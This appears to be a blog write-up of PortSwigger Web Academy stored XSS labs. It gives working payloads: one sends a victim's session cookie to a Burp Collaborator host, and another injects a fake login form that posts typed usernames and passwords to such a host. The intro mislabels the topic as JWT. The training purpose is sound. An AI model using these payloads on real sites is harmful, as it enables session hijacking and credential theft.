---
title: (Portswigger/WebAcademy) - Stored XSS
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2023-01-25 09:00:00 +0200
categories: [Web Application, Stored XSS]
tags: [Notes, Stored XSS, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the JWT Token Vulnerabilities.

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/jwt) Labs, but i do intent do throw other labs and writeups here as well.

To learn more on the topic, please visit the article linked above at Portswigger's.

## TOC

# Lab: Stored XSS into HTML context with nothing encoded

> This lab contains a stored cross-site scripting vulnerability in the comment functionality.
> 
> To solve this lab, submit a comment that calls the alert function when the blog post is viewed.

This is the webpage that we get on after we spin the lab.

![picture 1](images/c89ad083d0dfbc6bf908dee03f3b85576fec9ebd6173fb6b404523c35c5d80e7.png)  

We can send a post.

![picture 2](images/b031e33dd7fe51dd43480a4dd071803536d0795eb5608944dd97f82f19c204aa.png)  

Alert triggers on `Comment` entry:

![picture 3](images/03597b44f2184b36720316eb36fc70a886f1dacd05813a8c4e9d50a793a13804.png)  

Source Code
```html
<section class="comment">
  <p>
    <img src="/resources/images/avatarDefault.svg" class="avatar">                            
    <a id="author" href="http://&lt;script&gt;alert(3)&lt;/script&gt;.com">test&lt;script&gt;alert(2)&lt;/script&gt;</a> | 27 January 2023
  </p>
  <p><script>alert(1)</script></p>
  <p></p>
</section>
```

# Exploiting cross-site scripting to steal cookies
**Collaborator has to be used in order to solve the lab**
> This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

Webpage looks like in the previous lab.

We can trigger XSS in the `Comment` section.

![picture 4](images/207ea1c0215ff613634222a0788608ef5d3b3036d263a45d838dff43c35dd32d.png)  

Cookie will be printed in the alert popup.

![picture 5](images/dfa0f7dced73cca96f7ccd9020d0535652a8daa0ca86b3394b8a8940aebbe788.png)  

As we now need to exfiltrate the token, we'll need to use payload that will send that token to Burps Collaborator.

```
<script>location='http://iyk9morvj5u0hqdrwttw8300frli98xx.oastify.com/c='+document.cookie;</script>
```

We should soon see an entry in our Collaborator.

![picture 7](images/ccf5b54528ffc0de04cfd6fe3b61394e68582f7596e839821a832c568a002ad3.png)  

We can now simply change `session` token with the one found in Collaborator.

![picture 6](images/d87e266a5bc8a745214dadedbafddec619288d01d508bc10afe3f07f026ca1ad.png)  

# Exploiting cross-site scripting to capture passwords
**Collaborator has to be used in order to solve the lab**

> This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.

Lab looks exactly the same as the previous ones. We can send posts where XSS vulnerability resides.

To read the stored passwords, following payload will be used.

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length) fetch('http://2qtte8jfbpmk9a5bodlg0nsk7bd21vpk.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

![picture 8](images/1abcc075df1dc799630ce9a219c1cb6b366fccf029333c02d5f0adec91a0f95a.png)  

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length) fetch('http://2qtte8jfbpmk9a5bodlg0nsk7bd21vpk.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```